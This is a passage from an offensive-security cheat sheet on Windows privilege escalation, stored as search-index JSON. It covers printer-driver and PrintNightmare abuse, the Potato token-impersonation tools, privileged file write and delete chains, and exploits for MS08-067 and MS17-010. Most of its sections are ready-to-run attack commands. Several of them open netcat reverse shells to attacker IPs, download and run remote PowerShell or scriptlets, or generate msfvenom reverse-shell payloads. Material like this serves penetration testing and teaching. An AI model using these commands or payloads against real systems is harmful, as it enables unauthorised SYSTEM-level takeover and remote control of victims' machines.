\"legacy console mode\" Link -&gt; Internet Explorer -&gt; CTRL+O \u2013&gt; cmd.exe</li> </ul> </li> <li>GUI with direct actions: open a URL and start the browser then use the same scenario.</li> <li>Binaries/Scripts loaded from user writable paths: you might need to win the race condition.</li> <li>DLL hijacking/search order abusing</li> <li>PowerShell <code>-NoProfile</code> missing: Add custom commands into your profile     <pre><code>new-item -Path $PROFILE -Type file -Force\necho \"Start-Process -FilePath cmd.exe -Wait;\" &gt; $PROFILE\n</code></pre></li> </ul>"},{"location":"privilege-escalation/windows/#eop-insecure-gui-apps","title":"EoP - Insecure GUI apps","text":"<p>Application running as SYSTEM allowing an user to spawn a CMD, or browse directories.</p> <p>Example: \"Windows Help and Support\" (Windows + F1), search for \"command prompt\", click on \"Click to open Command Prompt\"</p>"},{"location":"privilege-escalation/windows/#eop-evaluating-vulnerable-drivers","title":"EoP - Evaluating Vulnerable Drivers","text":"<p>Look for vuln drivers loaded, we often don't spend enough time looking at this:</p> <ul> <li>Living Off The Land Drivers is a curated list of Windows drivers used by adversaries to bypass security controls and carry out attacks. The project helps security professionals stay informed and mitigate potential threats.</li> <li>Native binary: DriverQuery.exe     <pre><code>PS C:\\Users\\Swissky&gt; driverquery.exe /fo table /si\nModule Name  Display Name           Driver Type   Link Date\n============ ====================== ============= ======================\n1394ohci     1394 OHCI Compliant Ho Kernel        12/10/2006 4:44:38 PM\n3ware        3ware                  Kernel        5/18/2015 6:28:03 PM\nACPI         Microsoft ACPI Driver  Kernel        12/9/1975 6:17:08 AM\nAcpiDev      ACPI Devices driver    Kernel        12/7/1993 6:22:19 AM\nacpiex       Microsoft ACPIEx Drive Kernel        3/1/2087 8:53:50 AM\nacpipagr     ACPI Processor Aggrega Kernel        1/24/2081 8:36:36 AM\nAcpiPmi      ACPI Power Meter Drive Kernel        11/19/2006 9:20:15 PM\nacpitime     ACPI Wake Alarm Driver Kernel        2/9/1974 7:10:30 AM\nADP80XX      ADP80XX                Kernel        4/9/2015 4:49:48 PM\n&lt;SNIP&gt;\n</code></pre></li> <li>matterpreter/OffensiveCSharp/DriverQuery <pre><code>PS C:\\Users\\Swissky&gt; DriverQuery.exe --no-msft\n[+] Enumerating driver services...\n[+] Checking file signatures...\nCitrix USB Filter Driver\n    Service Name: ctxusbm\n    Path: C:\\Windows\\system32\\DRIVERS\\ctxusbm.sys\n    Version: 14.11.0.138\n    Creation Time (UTC): 17/05/2018 01:20:50\n    Cert Issuer: CN=Symantec Class 3 SHA256 Code Signing CA, OU=Symantec Trust Network, O=Symantec Corporation, C=US\n    Signer: CN=\"Citrix Systems, Inc.\", OU=XenApp(ClientSHA256), O=\"Citrix Systems, Inc.\", L=Fort Lauderdale, S=Florida, C=US\n&lt;SNIP&gt;\n</code></pre></li> </ul>"},{"location":"privilege-escalation/windows/#eop-printers","title":"EoP - Printers","text":""},{"location":"privilege-escalation/windows/#universal-printer","title":"Universal Printer","text":"<p>Create a Printer</p> <pre><code>$printerName     = 'Universal Priv Printer'\n$system32        = $env:systemroot + '\\system32'\n$drivers         = $system32 + '\\spool\\drivers'\n$RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\Printers\\' + $printerName\n\nCopy-Item -Force -Path ($system32 + '\\mscms.dll')             -Destination ($system32 + '\\mimispool.dll')\nCopy-Item -Force -Path '.\\mimikatz_trunk\\x64\\mimispool.dll'   -Destination ($drivers  + '\\x64\\3\\mimispool.dll')\nCopy-Item -Force -Path '.\\mimikatz_trunk\\win32\\mimispool.dll' -Destination ($drivers  + '\\W32X86\\3\\mimispool.dll')\n\nAdd-PrinterDriver -Name       'Generic / Text Only'\nAdd-Printer       -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared\n\nNew-Item         -Path ($RegStartPrinter + '\\CopyFiles')        | Out-Null\nNew-Item         -Path ($RegStartPrinter + '\\CopyFiles\\Kiwi')   | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Kiwi')   -Name 'Directory' -PropertyType 'String'      -Value 'x64\\3'           | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Kiwi')   -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Kiwi')   -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null\nNew-Item         -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') -Name 'Directory' -PropertyType 'String'      -Value 'W32X86\\3'        | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null\nNew-Item         -Path ($RegStartPrinter + '\\CopyFiles\\Mango')  | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Mango')  -Name 'Directory' -PropertyType 'String'      -Value $null             | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Mango')  -Name 'Files'     -PropertyType 'MultiString' -Value $null             | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Mango')  -Name 'Module'    -PropertyType 'String'      -Value 'mimispool.dll'   | Out-Null\n</code></pre> <p>Execute the driver</p> <pre><code>$serverName  = 'dc.purple.lab'\n$printerName = 'Universal Priv Printer'\n$fullprinterName = '\\\\' + $serverName + '\\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})\nRemove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue\nAdd-Printer -ConnectionName $fullprinterName\n</code></pre>"},{"location":"privilege-escalation/windows/#printernightmare","title":"PrinterNightmare","text":"<pre><code>git clone https://github.com/Flangvik/DeployPrinterNightmare\nPS C:\\adversary&gt; FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell\n[&lt;3] @Flangvik - TrustedSec\n[+] Copying C:\\Windows\\system32\\mscms.dll to C:\\Windows\\system32\\6cfbaf26f4c64131896df8a522546e9c.dll\n[+] Copying 64mimispool.dll to C:\\Windows\\system32\\spool\\drivers\\x64\\3\\6cfbaf26f4c64131896df8a522546e9c.dll\n[+] Copying 32mimispool.dll to C:\\Windows\\system32\\spool\\drivers\\W32X86\\3\\6cfbaf26f4c64131896df8a522546e9c.dll\n[+] Adding printer driver =&gt; Generic / Text Only!\n[+] Adding printer =&gt; EasySystemShell!\n[+] Setting 64-bit Registry key\n[+] Setting 32-bit Registry key\n[+] Setting '*' Registry key\n</code></pre> <pre><code>PS C:\\target&gt; $serverName  = 'printer-installed-host'\nPS C:\\target&gt; $printerName = 'EasySystemShell'\nPS C:\\target&gt; $fullprinterName = '\\\\' + $serverName + '\\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})\nPS C:\\target&gt; Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue\nPS C:\\target&gt; Add-Printer -ConnectionName $fullprinterName\n</code></pre>"},{"location":"privilege-escalation/windows/#bring-your-own-vulnerability","title":"Bring Your Own Vulnerability","text":"<p>Concealed Position : https://github.com/jacob-baines/concealed_position</p> <ul> <li>ACIDDAMAGE - CVE-2021-35449 - Lexmark Universal Print Driver LPE</li> <li>RADIANTDAMAGE - CVE-2021-38085 - Canon TR150 Print Driver LPE</li> <li>POISONDAMAGE - CVE-2019-19363 - Ricoh PCL6 Print Driver LPE</li> <li>SLASHINGDAMAGE - CVE-2020-1300 - Windows Print Spooler LPE</li> </ul> <pre><code>cp_server.exe -e ACIDDAMAGE\n# Get-Printer\n# Set the \"Advanced Sharing Settings\" -&gt; \"Turn off password protected sharing\"\ncp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE\ncp_client.exe -l -e ACIDDAMAGE\n</code></pre>"},{"location":"privilege-escalation/windows/#eop-runas","title":"EoP - Runas","text":"<p>Use the <code>cmdkey</code> to list the stored credentials on the machine.</p> <pre><code>cmdkey /list\nCurrently stored credentials:\n Target: Domain:interactive=WORKGROUP\\Administrator\n Type: Domain Password\n User: WORKGROUP\\Administrator\n</code></pre> <p>Then you can use <code>runas</code> with the <code>/savecred</code> options in order to use the saved credentials.  The following example is calling a remote binary via an SMB share. <pre><code>runas /savecred /user:WORKGROUP\\Administrator \"\\\\10.XXX.XXX.XXX\\SHARE\\evil.exe\"\nrunas /savecred /user:Administrator \"cmd.exe /k whoami\"\n</code></pre></p> <p>Using <code>runas</code> with a provided set of credential.</p> <pre><code>C:\\Windows\\System32\\runas.exe /env /noprofile /user:&lt;username&gt; &lt;password&gt; \"c:\\users\\Public\\nc.exe -nc &lt;attacker-ip&gt; 4444 -e cmd.exe\"\n</code></pre> <pre><code>$secpasswd = ConvertTo-SecureString \"&lt;password&gt;\" -AsPlainText -Force\n$mycreds = New-Object System.Management.Automation.PSCredential (\"&lt;user&gt;\", $secpasswd)\n$computer = \"&lt;hostname&gt;\"\n[System.Diagnostics.Process]::Start(\"C:\\users\\public\\nc.exe\",\"&lt;attacker_ip&gt; 4444 -e cmd.exe\", $mycreds.Username, $mycreds.Password, $computer)\n</code></pre>"},{"location":"privilege-escalation/windows/#eop-abusing-shadow-copies","title":"EoP - Abusing Shadow Copies","text":"<p>If you have local administrator access on a machine try to list shadow copies, it's an easy way for Privilege Escalation.</p> <pre><code># List shadow copies using vssadmin (Needs Admnistrator Access)\nvssadmin list shadows\n\n# List shadow copies using diskshadow\ndiskshadow list shadows all\n\n# Make a symlink to the shadow copy and access it\nmklink /d c:\\shadowcopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\\n</code></pre>"},{"location":"privilege-escalation/windows/#eop-from-local-administrator-to-nt-system","title":"EoP - From local administrator to NT SYSTEM","text":"<pre><code>PsExec.exe -i -s cmd.exe\n</code></pre>"},{"location":"privilege-escalation/windows/#eop-living-off-the-land-binaries-and-scripts","title":"EoP - Living Off The Land Binaries and Scripts","text":"<p>Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/</p> <p>The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques. A LOLBin/Lib/Script must:</p> <ul> <li>Be a Microsoft-signed file, either native to the OS or downloaded from Microsoft. Have extra \"unexpected\" functionality. It is not interesting to document intended use cases. Exceptions are application whitelisting bypasses</li> <li>Have functionality that would be useful to an APT or red team</li> </ul> <pre><code>wmic.exe process call create calc\nregsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll\nMicrosoft.Workflow.Compiler.exe tests.xml results.xml\n</code></pre>"},{"location":"privilege-escalation/windows/#eop-impersonation-privileges","title":"EoP - Impersonation Privileges","text":"<p>Full privileges cheatsheet at https://github.com/gtworek/Priv2Admin, summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.</p> Privilege Impact Tool Execution path Remarks <code>SeAssignPrimaryToken</code> Admin 3rd party tool \"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe\" Thank you Aur\u00e9lien Chalot for the update. I will try to re-phrase it to something more recipe-like soon. <code>SeBackup</code> Threat Built-in commands Read sensitve files with <code>robocopy /b</code> - May be more interesting if you can read %WINDIR%\\MEMORY.DMP - <code>SeBackupPrivilege</code> (and robocopy) is not helpful when it comes to open files. - Robocopy requires both SeBackup and SeRestore to work with /b parameter. <code>SeCreateToken</code> Admin 3rd party tool Create arbitrary token including local admin rights with <code>NtCreateToken</code>. <code>SeDebug</code> Admin PowerShell Duplicate the <code>lsass.exe</code> token. Script to be found at FuzzySecurity <code>SeLoadDriver</code> Admin 3rd party tool 1. Load buggy kernel driver such as <code>szkg64.sys</code> or <code>capcom.sys</code>2. Exploit the driver vulnerability  Alternatively, the privilege may be used to unload security-related drivers with <code>ftlMC</code> builtin command. i.e.: <code>fltMC sysmondrv</code> 1. The <code>szkg64</code> vulnerability is listed as CVE-2018-157322. The <code>szkg64</code> exploit code was created by Parvez Anwar <code>SeRestore</code> Admin PowerShell 1. Launch PowerShell/ISE with the SeRestore privilege present.2. Enable the privilege with Enable-SeRestorePrivilege).3. Rename utilman.exe to utilman.old4. Rename cmd.exe to utilman.exe5. Lock the console and press Win+U Attack may be detected by some AV software. Alternative method relies on replacing service binaries stored in \"Program Files\" using the same privilege. <code>SeTakeOwnership</code> Admin Built-in commands 1. <code>takeown.exe /f \"%windir%\\system32\"</code>2. <code>icalcs.exe \"%windir%\\system32\" /grant \"%username%\":F</code>3. Rename cmd.exe to utilman.exe4. Lock the console and press Win+U Attack may be detected by some AV software. Alternative method relies on replacing service binaries stored in \"Program Files\" using the same privilege. <code>SeTcb</code> Admin 3rd party tool Manipulate tokens to have local admin rights included. May require SeImpersonate. To be verified."},{"location":"privilege-escalation/windows/#restore-a-service-accounts-privileges","title":"Restore A Service Account's Privileges","text":"<p>This tool should be executed as LOCAL SERVICE or NETWORK SERVICE only. <pre><code># https://github.com/itm4n/FullPowers\nc:\\TOOLS&gt;FullPowers\n[+] Started dummy thread with id 9976\n[+] Successfully created scheduled task.\n[+] Got new token! Privilege count: 7\n[+] CreateProcessAsUser() OK\nMicrosoft Windows [Version 10.0.19041.84]\n(c) 2019 Microsoft Corporation. All rights reserved.\nC:\\WINDOWS\\system32&gt;whoami /priv\nPRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                               State\n============================= ========================================= =======\nSeAssignPrimaryTokenPrivilege Replace a process level token             Enabled\nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled\nSeAuditPrivilege              Generate security audits                  Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled\nSeImpersonatePrivilege        Impersonate a client after authentication Enabled\nSeCreateGlobalPrivilege       Create global objects                     Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set            Enabled\nc:\\TOOLS&gt;FullPowers -c \"C:\\TOOLS\\nc64.exe 1.2.3.4 1337 -e cmd\" -z\n</code></pre></p>"},{"location":"privilege-escalation/windows/#meterpreter-getsystem-and-alternatives","title":"Meterpreter getsystem and alternatives","text":"<pre><code>meterpreter&gt; getsystem \nTokenvator.exe getsystem cmd.exe \nincognito.exe execute -c \"NT AUTHORITY\\SYSTEM\" cmd.exe \npsexec -s -i cmd.exe \npython getsystem.py # from https://github.com/sailay1996/tokenx_privEsc\n</code></pre>"},{"location":"privilege-escalation/windows/#rottenpotato-token-impersonation","title":"RottenPotato (Token Impersonation)","text":"<ul> <li>Binary available at : foxglovesec/RottenPotato and breenmachine/RottenPotatoNG</li> <li>Exploit using Metasploit with <code>incognito mode</code> loaded.     <pre><code>getuid\ngetprivs\nuse incognito\nlist\\_tokens -u\ncd c:\\temp\\\nexecute -Hc -f ./rot.exe\nimpersonate\\_token \"NT AUTHORITY\\SYSTEM\"\n</code></pre></li> </ul> <pre><code>Invoke-TokenManipulation -ImpersonateUser -Username \"lab\\domainadminuser\"\nInvoke-TokenManipulation -ImpersonateUser -Username \"NT AUTHORITY\\SYSTEM\"\nGet-Process wininit | Invoke-TokenManipulation -CreateProcess \"Powershell.exe -nop -exec bypass -c \\\"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\\\"};\"\n</code></pre>"},{"location":"privilege-escalation/windows/#juicy-potato-abusing-the-golden-privileges","title":"Juicy Potato (Abusing the golden privileges)","text":"<p>If the machine is &gt;= Windows 10 1809 &amp; Windows Server 2019 - Try Rogue Potato  If the machine is &lt; Windows 10 1809 &lt; Windows Server 2019 - Try Juicy Potato * Binary available at : ohpe/juicy-potato </p> <ol> <li> <p>Check the privileges of the service account, you should look for SeImpersonate and/or SeAssignPrimaryToken (Impersonate a client after authentication)</p> <pre><code>whoami /priv\n</code></pre> </li> <li> <p>Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object</p> <ul> <li>Windows 7 Enterprise </li> <li>Windows 8.1 Enterprise</li> <li>Windows 10 Enterprise</li> <li>Windows 10 Professional</li> <li>Windows Server 2008 R2 Enterprise </li> <li>Windows Server 2012 Datacenter</li> <li>Windows Server 2016 Standard </li> </ul> </li> <li> <p>Execute JuicyPotato to run a privileged command.</p> <pre><code>JuicyPotato.exe -l 9999 -p c:\\interpub\\wwwroot\\upload\\nc.exe -a \"IP PORT -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\nJuicyPotato.exe -l 1340 -p C:\\users\\User\\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}\nJuicyPotato.exe -l 1337 -p c:\\Windows\\System32\\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a \"/c c:\\users\\User\\reverse_shell.exe\"\n    Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337\n    ......\n    [+] authresult 0\n    {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\\SYSTEM\n    [+] CreateProcessWithTokenW OK\n</code></pre> </li> </ol>"},{"location":"privilege-escalation/windows/#rogue-potato-fake-oxid-resolver","title":"Rogue Potato (Fake OXID Resolver)","text":"<ul> <li>Binary available at antonioCoco/RoguePotato</li> </ul> <pre><code># Network redirector / port forwarder to run on your remote machine, must use port 135 as src port\nsocat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999\n# RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. \n# Use this if you have fw restrictions.\nRoguePotato.exe -r 10.0.0.3 -e \"C:\\windows\\system32\\cmd.exe\"\n# RoguePotato all in one with RogueOxidResolver running locally on port 9999\nRoguePotato.exe -r 10.0.0.3 -e \"C:\\windows\\system32\\cmd.exe\" -l 9999\n#RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename\nRoguePotato.exe -r 10.0.0.3 -e \"C:\\windows\\system32\\cmd.exe\" -l 9999 -c \"{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}\" -p splintercode\n</code></pre>"},{"location":"privilege-escalation/windows/#efspotato-ms-efsr-efsrpcopenfileraw","title":"EFSPotato (MS-EFSR EfsRpcOpenFileRaw)","text":"<ul> <li>Binary available at https://github.com/zcgonvh/EfsPotato</li> </ul> <pre><code># .NET 4.x\ncsc EfsPotato.cs\ncsc /platform:x86 EfsPotato.cs\n# .NET 2.0/3.5\nC:\\Windows\\Microsoft.Net\\Framework\\V3.5\\csc.exe EfsPotato.cs\nC:\\Windows\\Microsoft.Net\\Framework\\V3.5\\csc.exe /platform:x86 EfsPotato.cs\n</code></pre>"},{"location":"privilege-escalation/windows/#juicypotatong","title":"JuicyPotatoNG","text":"<ul> <li>antonioCoco/JuicyPotatoNG</li> </ul> <pre><code>JuicyPotatoNG.exe -t * -p \"C:\\Windows\\System32\\cmd.exe\" -a \"/c whoami\" &gt; C:\\juicypotatong.txt\n</code></pre>"},{"location":"privilege-escalation/windows/#printspoofer-printer-bug","title":"PrintSpoofer (Printer Bug)","text":"<p>this work if SeImpersonatePrivilege is enabled * Binary available at https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0</p> <pre><code># run nc -lnvp 443 then :\n.\\PrintSpoofer64.exe -c \"C:\\Temp\\nc64.exe 192.168.45.171 443 -e cmd\"\n# without listener\n.\\PrintSpoofer64.exe -i -c cmd\n# Via RPD\n.\\PrintSpoofer64.exe -d 3 -c \"powershell -ep bypass\"\n</code></pre>"},{"location":"privilege-escalation/windows/#eop-privileged-file-write","title":"EoP - Privileged File Write","text":""},{"location":"privilege-escalation/windows/#diaghub","title":"DiagHub","text":"<p> Starting with version 1903 and above, DiagHub can no longer be used to load arbitrary DLLs.</p> <p>The Microsoft Diagnostics Hub Standard Collector Service (DiagHub) is a service that collects trace information and is programmatically exposed via DCOM.  This DCOM object can be used to load a DLL into a SYSTEM process, provided that this DLL exists in the <code>C:\\Windows\\System32</code> directory. </p>"},{"location":"privilege-escalation/windows/#exploit","title":"Exploit","text":"<ol> <li>Create an evil DLL e.g: payload.dll and move it into <code>C:\\Windows\\System32</code></li> <li>Build https://github.com/xct/diaghub</li> <li><code>diaghub.exe c:\\\\ProgramData\\\\ payload.dll</code></li> </ol> <p>The default payload will run <code>C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -lvp 2000 -e cmd.exe</code></p> <p>Alternative tools: * https://github.com/Accenture/AARO-Bugs/tree/master/CVE-2020-5825/TrigDiag * https://github.com/decoder-it/diaghub_exploit</p>"},{"location":"privilege-escalation/windows/#usodllloader","title":"UsoDLLLoader","text":"<p> 2020-06-06 Update: this trick no longer works on the latest builds of Windows 10 Insider Preview.</p> <p>An alternative to the DiagHub DLL loading \"exploit\" found by James Forshaw (a.k.a. @tiraniddo) If we found a privileged file write vulnerability in Windows or in some third-party software, we could copy our own version of <code>windowscoredeviceinfo.dll</code> into <code>C:\\Windows\\Sytem32\\</code> and then have it loaded by the USO service to get arbitrary code execution as NT AUTHORITY\\System.</p>"},{"location":"privilege-escalation/windows/#exploit_1","title":"Exploit","text":"<ol> <li>Build https://github.com/itm4n/UsoDllLoader<ul> <li>Select Release config and x64 architecure.</li> <li>Build solution.<ul> <li>DLL .\\x64\\Release\\WindowsCoreDeviceInfo.dll</li> <li>Loader .\\x64\\Release\\UsoDllLoader.exe.</li> </ul> </li> </ul> </li> <li>Copy <code>WindowsCoreDeviceInfo.dll</code> to <code>C:\\Windows\\System32\\</code></li> <li>Use the loader and wait for the shell or run <code>usoclient StartInteractiveScan</code> and connect to the bind shell on port 1337.</li> </ol>"},{"location":"privilege-escalation/windows/#wertrigger","title":"WerTrigger","text":"<p>Exploit Privileged File Writes bugs with Windows Problem Reporting 1. Clone https://github.com/sailay1996/WerTrigger 2. Copy <code>phoneinfo.dll</code> to <code>C:\\Windows\\System32\\</code> 3. Place <code>Report.wer</code> file and <code>WerTrigger.exe</code> in a same directory. 4. Then, run <code>WerTrigger.exe</code>. 5. Enjoy a shell as NT AUTHORITY\\SYSTEM</p>"},{"location":"privilege-escalation/windows/#wermgr","title":"WerMgr","text":"<p>Exploit Privileged Directory Creation Bugs with Windows Error Reporting 1. Clone https://github.com/binderlabs/DirCreate2System 2. Create directory <code>C:\\Windows\\System32\\wermgr.exe.local\\</code> 3. Grant access to it: <code>cacls C:\\Windows\\System32\\wermgr.exe.local /e /g everyone:f</code> 4. Place <code>spawn.dll</code> file and <code>dircreate2system.exe</code> in a same directory and run <code>.\\dircreate2system.exe</code>.  5. Enjoy a shell as NT AUTHORITY\\SYSTEM</p>"},{"location":"privilege-escalation/windows/#eop-privileged-file-delete","title":"EoP - Privileged File Delete","text":"<p>During an MSI installation, the Windows Installer service maintains a record of every changes in case it needs to be rolled back, to do that it will create:</p> <ul> <li>a folder at <code>C:\\Config.Msi</code> containing <ul> <li>a rollback script (<code>.rbs</code>) </li> <li>a rollback file (<code>.rbf</code>)</li> </ul> </li> </ul> <p>To convert a privileged file delete to a local privilege escalation, you need to abuse the Windows Installer service. * delete the protected <code>C:\\Config.Msi</code> folder immediately after it's created by the Windows Installer * recreate the <code>C:\\Config.Msi</code> folder with weak DACL permissions since ordinary users are allowed to create folders at the root of <code>C:\\</code>. * drop malicious <code>.rbs</code> and <code>.rbf</code> files into it to be executed by the MSI rollback * then upon rollback, Windows Installer will make arbitrary changes to the system</p> <p>The easiest way to trigger this chain is using thezdi/FilesystemEoPs/FolderOrFileDeleteToSystem. The exploit contains a .msi file with 2 actions, the first one produces a delay and the second throws an error to make it rollback. This rollback will \"restore\" a malicious HID.dll in <code>C:\\Program Files\\Common Files\\microsoft shared\\ink\\HID.dll</code>.</p> <p>Then switch to the secure desktop using <code>[CTRL]+[ALT]+[DELETE]</code> and open the On-Screen Keyboard (<code>osk.exe</code>). The <code>osk.exe</code> process first looks for the <code>C:\\Program Files\\Common Files\\microsoft shared\\ink\\HID.dll</code> library instead of <code>C:\\Windows\\System32\\HID.dll</code></p>"},{"location":"privilege-escalation/windows/#eop-common-vulnerabilities-and-exposure","title":"EoP - Common Vulnerabilities and Exposure","text":""},{"location":"privilege-escalation/windows/#ms08-067-netapi","title":"MS08-067 (NetAPI)","text":"<p>Check the vulnerability with the following nmap script.</p> <pre><code>nmap -Pn -p445\u200a--open\u200a--max-hostgroup 3\u200a--script smb-vuln-ms08-067 &lt;ip_netblock&gt;\n</code></pre> <p>Metasploit modules to exploit <code>MS08-067 NetAPI</code>.</p> <pre><code>exploit/windows/smb/ms08_067_netapi\n</code></pre> <p>If you can't use Metasploit and only want a reverse shell.</p> <pre><code>https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -b \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\" -f py -v shellcode -a x86 --platform windows\nExample: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445\nExample: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)\nExample: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal\nExample: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English\nExample: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)\nExample: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)\nExample: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)\npython ms08-067.py 10.0.0.1 6 445\n</code></pre>"},{"location":"privilege-escalation/windows/#ms10-015-kitrap0d-microsoft-windows-nt200020032008xpvista7","title":"MS10-015 (KiTrap0D) - Microsoft Windows NT/2000/2003/2008/XP/Vista/7","text":"<p>'KiTrap0D' User Mode to Ring Escalation (MS10-015)</p> <pre><code>https://www.exploit-db.com/exploits/11199\nMetasploit : exploit/windows/local/ms10_015_kitrap0d\n</code></pre>"},{"location":"privilege-escalation/windows/#ms11-080-afdsys-microsoft-windows-xp2003","title":"MS11-080 (afd.sys) - Microsoft Windows XP/2003","text":"<pre><code>Python: https://www.exploit-db.com/exploits/18176\nMetasploit: exploit/windows/local/ms11_080_afdjoinleaf\n</code></pre>"},{"location":"privilege-escalation/windows/#ms15-051-client-copy-image-microsoft-windows-20032008782012","title":"MS15-051 (Client Copy Image) - Microsoft Windows 2003/2008/7/8/2012","text":"<pre><code>printf(\"[#] usage: ms15-051 command \\n\");\nprintf(\"[#] eg: ms15-051 \\\"whoami /all\\\" \\n\");\n# x32\nhttps://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/Win32/ms15-051.exe\n# x64\nhttps://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/x64/ms15-051.exe\nhttps://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051\nuse exploit/windows/local/ms15_051_client_copy_image\n</code></pre>"},{"location":"privilege-escalation/windows/#ms16-032-microsoft-windows-7-10-2008-2012-r2-x86x64","title":"MS16-032 - Microsoft Windows 7 &lt; 10 / 2008 &lt; 2012 R2 (x86/x64)","text":"<p>Check if the patch is installed : <code>wmic qfe list | findstr \"3139914\"</code></p> <pre><code>Powershell:\nhttps://www.exploit-db.com/exploits/39719/\nhttps://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1\nBinary exe : https://github.com/Meatballs1/ms16-032\nMetasploit : exploit/windows/local/ms16_032_secondary_logon_handle_privesc\n</code></pre>"},{"location":"privilege-escalation/windows/#ms17-010-eternal-blue","title":"MS17-010 (Eternal Blue)","text":"<p>Check the vulnerability with the following nmap script or crackmapexec: <code>crackmapexec smb 10.10.10.10 -u '' -p '' -d domain -M ms17-010</code>.</p> <pre><code>nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17\u2013010 &lt;ip_netblock&gt;\n</code></pre> <p>Metasploit modules to exploit <code>EternalRomance/EternalSynergy/EternalChampion</code>.</p> <pre><code>auxiliary/admin/smb/ms17_010_command          MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution\nauxiliary/scanner/smb/smb_ms17_010            MS17-010 SMB RCE Detection\nexploit/windows/smb/ms17_010_eternalblue      MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\nexploit/windows/smb/ms17_010_eternalblue_win8 MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+\nexploit/windows/smb/ms17_010_psexec           MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\n</code></pre> <p>If you can't use Metasploit and only want a reverse shell.</p> <pre><code>git clone https://github.com/helviojunior/MS17-010\n# generate a simple reverse shell to use\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe\npython2 send_and_execute.py 10.0.0.1 revshell.exe\n</code></pre>"},{"location":"privilege-escalation/windows/#cve-2019-1388","title":"CVE-2019-1388","text":"<p>Exploit : https://packetstormsecurity.com/files/14437/hhupd.exe.html</p> <p>Requirement: - Windows 7  - Windows 10 LTSC 10240</p> <p>Failing on :  - LTSC 2019 - 1709 - 1803</p> <p>Detailed information about the vulnerability : 